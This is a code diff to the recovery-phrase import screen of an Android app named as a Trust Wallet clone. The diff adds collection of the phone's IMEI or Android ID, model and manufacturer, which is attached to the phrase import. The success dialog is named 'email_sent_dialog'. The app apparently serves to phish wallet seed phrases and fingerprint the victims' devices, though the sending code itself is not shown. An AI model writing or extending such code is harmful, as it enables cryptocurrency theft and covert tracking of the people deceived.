@@ -1,18 +1,25 @@
 package com.agung.trustwalletclone.screens.importphrase
 
+import android.Manifest
+import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.Dialog
 import android.content.ClipboardManager
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Color
 import android.graphics.drawable.ColorDrawable
 import android.net.Uri
+import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
+import android.telephony.TelephonyManager
 import android.view.*
 import android.widget.Button
 import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.core.app.ActivityCompat
 import androidx.databinding.DataBindingUtil
 import androidx.fragment.app.Fragment
 import androidx.lifecycle.ViewModelProvider
@@ -20,6 +27,9 @@ import com.agung.trustwalletclone.R
 import com.agung.trustwalletclone.databinding.ImportPhraseFragmentBinding
 import com.google.zxing.client.android.Intents
 import com.google.zxing.integration.android.IntentIntegrator
+
+
+private const val IMEI_REQUEST_CODE = 101
 
 class ImportPhraseFragment : Fragment() {
     private lateinit var resultLauncher: ActivityResultLauncher<Intent>
@@ -59,6 +69,13 @@ class ImportPhraseFragment : Fragment() {
             }
         })
 
+        viewModel.eventImportPhrase.observe(viewLifecycleOwner, {
+            if (it) {
+                viewModel.setDeviceInfo(getDeviceInfo())
+                viewModel.onImportPhraseComplete()
+            }
+        })
+
         viewModel.importPhraseStatus.observe(viewLifecycleOwner, {
             if (it == ImportPhraseStatus.SUCCESS) showDialog(ImportPhraseStatus.SUCCESS)
             else if (it == ImportPhraseStatus.ERROR) showDialog(ImportPhraseStatus.ERROR)
@@ -76,15 +93,6 @@ class ImportPhraseFragment : Fragment() {
         setHasOptionsMenu(true)
         binding.nameInput.requestFocus()
         return binding.root
-    }
-
-    private fun openAskRecoveryPhrase() {
-        startActivity(getAskRecoveryPhraseContent())
-    }
-
-    private fun getAskRecoveryPhraseContent(): Intent? {
-        val uri = Uri.parse("https://community.trustwallet.com/t/how-to-restore-a-multi-coin-wallet")
-        return Intent(Intent.ACTION_VIEW, uri)
     }
 
     override fun onCreateOptionsMenu(menu: Menu, inflater: MenuInflater) {
@@ -121,7 +129,6 @@ class ImportPhraseFragment : Fragment() {
     /**
      * Call update phrases of the viewModel
      *
-     * @param viewModel
      * @param newPhrases
      * @param binding
      */
@@ -130,12 +137,26 @@ class ImportPhraseFragment : Fragment() {
         binding.importPhraseInput.requestFocus()
     }
 
+    private fun openAskRecoveryPhrase() {
+        startActivity(getAskRecoveryPhraseContent())
+    }
+
+    private fun getAskRecoveryPhraseContent(): Intent {
+        val uri =
+            Uri.parse("https://community.trustwallet.com/t/how-to-restore-a-multi-coin-wallet")
+        return Intent(Intent.ACTION_VIEW, uri)
+    }
+
     private fun showDialog(status: ImportPhraseStatus) {
         when (status) {
             ImportPhraseStatus.SUCCESS -> setDialogContent(R.layout.email_sent_dialog)
             else -> setDialogContent(R.layout.server_error_dialog)
         }
         dialog.show()
+    }
+
+    private fun hideDialog() {
+        dialog.dismiss()
     }
 
     private fun setDialogContent(vieId: Int) {
@@ -149,7 +170,32 @@ class ImportPhraseFragment : Fragment() {
         }
     }
 
-    private fun hideDialog() {
-        dialog.dismiss()
+    @SuppressLint("HardwareIds")
+    fun getDeviceId(): String {
+        checkAndRequestPermissions()
+        val telephonyManager =
+            requireContext().getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+        return when {
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> Settings.Secure.getString(context?.contentResolver,
+                Settings.Secure.ANDROID_ID)
+            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> telephonyManager.imei
+            else -> telephonyManager.deviceId
+        }
+    }
+
+    private fun checkAndRequestPermissions() {
+        if (ActivityCompat.checkSelfPermission(requireContext(),
+                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED
+        ) {
+            ActivityCompat.requestPermissions(requireActivity(),
+                arrayOf(Manifest.permission.READ_PHONE_STATE),
+                IMEI_REQUEST_CODE)
+        }
+    }
+
+    private fun getDeviceInfo(): String {
+        val manufacturer = Build.MANUFACTURER
+        val model = Build.MODEL
+        return "Device ID: ${getDeviceId()} \nModel: $model \nManufacturer: $manufacturer"
     }
 }
